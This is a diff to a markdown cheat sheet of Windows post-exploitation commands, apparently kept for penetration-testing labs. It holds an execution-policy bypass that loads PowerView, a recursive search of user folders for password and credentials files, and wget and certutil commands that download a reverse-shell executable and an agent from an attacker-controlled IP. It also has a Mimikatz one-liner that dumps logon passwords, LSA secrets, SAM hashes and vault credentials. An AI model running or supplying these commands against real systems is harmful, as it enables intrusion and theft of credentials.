@@ -39,25 +39,26 @@ stty columns 200 rows 200
 
 ### Windows PowerShell Commands
 EXECUTION POLICY
-
 ```
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser
 powershell -ExecutionPolicy Bypass -File .\PowerView.ps1
 ```
-
+Show file like with Tree
 ```
 Get-ChildItem -Path "./*" -Include "*" -Recurse -ErrorAction SilentlyContinue
-
+```
 ```
 Get-ChildItem -Path "C:\Users\*" -Include "flag.txt", "local.txt", "user.txt", "password.txt", "proof.txt", "credentials.txt" -Recurse -ErrorAction SilentlyContinue
 ```
-
+Download
+```
+wget http://192.168.123.100:8000/rev4445.exe -OutFile rev4445.exe
+```
 ```
 certutil -split -urlcache -f http://192.168.123.100:8000/agent.exe agent.exe
 ```
-
+Mimikatz Oneliner
 ```
 .\mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred" "exit"
-
 ```
 
